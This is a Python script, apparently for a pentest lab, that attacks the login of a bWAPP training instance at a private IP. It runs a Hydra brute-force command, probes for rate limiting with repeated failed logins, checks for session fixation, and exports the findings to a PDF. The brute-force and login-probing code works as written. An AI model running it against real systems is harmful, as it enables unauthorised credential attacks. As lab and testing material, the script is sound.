import subprocess
import requests
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# ---- [1] Run Hydra Brute-Force Attack ----
def run_hydra(ip):
    print("\n[!] Running Hydra brute-force...")
    cmd = f"hydra -l bee -P passwords.txt {ip} http-post-form \"/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid\""
    subprocess.run(cmd, shell=True)

# ---- [2] Test for Rate Limiting ----
def test_rate_limit(ip):
    print("\n[!] Testing for Rate Limiting...")
    session = requests.Session()
    results = []

    for i in range(10):
        r = session.post(f"http://{ip}/bWAPP/login.php", data={
            "login": "bee",
            "password": "wrongpass",
            "security_level": "0",
            "form": "submit"
        })

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Attempt {i+1}: Status = {r.status_code}"

        if "Invalid" in r.text:
            log_entry += " → Invalid login detected"
        else:
            log_entry += " → Possibly successful or blocked"

        print(log_entry)
        results.append(log_entry)

    print("[*] If no blocking occurred after 10 attempts → No Rate Limiting\n")
    return results

# ---- [3] Test for Session Fixation ----
def test_session_fixation(ip):
    print("\n[!] Checking for Session Fixation...")

    s1 = requests.Session()
    r1 = s1.get(f"http://{ip}/bWAPP/login.php")
    session_before = s1.cookies.get_dict().get("PHPSESSID")

    r2 = s1.post(f"http://{ip}/bWAPP/login.php", data={
        "login": "bee",
        "password": "bug",
        "security_level": "0",
        "form": "submit"
    })
    session_after = s1.cookies.get_dict().get("PHPSESSID")

    print(f"Session before login: {session_before}")
    print(f"Session after login : {session_after}")

    if session_before == session_after:
        result = "⚠️  Session Fixation detected (session didn't change)"
    else:
        result = "✅ Session regenerated correctly after login"

    print(result + "\n")
    return session_before, session_after, result

# ---- [4] Export Summary to PDF ----
def write_pdf_summary(rate_logs, session_before, session_after, session_result):
    filename = "auth_report.pdf"
    c = canvas.Canvas(filename, pagesize=letter)
    width, height = letter
    y = height - 40

    c.setFont("Helvetica-Bold", 14)
    c.drawString(40, y, "Broken Authentication Test Summary")
    y -= 30

    c.setFont("Helvetica", 12)
    c.drawString(40, y, "- Brute Force Login Test: Used Hydra to test weak passwords.")
    y -= 20
    c.drawString(40, y, "- Rate Limiting Test (10 attempts):")
    y -= 20

    for log in rate_logs:
        c.drawString(60, y, log)
        y -= 15
        if y < 50:
            c.showPage()
            y = height - 40

    c.drawString(40, y, "- Session Fixation Test:")
    y -= 20
    c.drawString(60, y, f"Session before login: {session_before}")
    y -= 15
    c.drawString(60, y, f"Session after login : {session_after}")
    y -= 15
    c.drawString(60, y, session_result)

    c.save()
    print(f"📄 Report saved as '{filename}'.")

# ---- [5] Run All Tests ----
target_ip = "192.168.100.5"
run_hydra(target_ip)
rate_logs = test_rate_limit(target_ip)
session_before, session_after, session_result = test_session_fixation(target_ip)
write_pdf_summary(rate_logs, session_before, session_after, session_result)

print("✅ All tests completed and PDF report generated.")

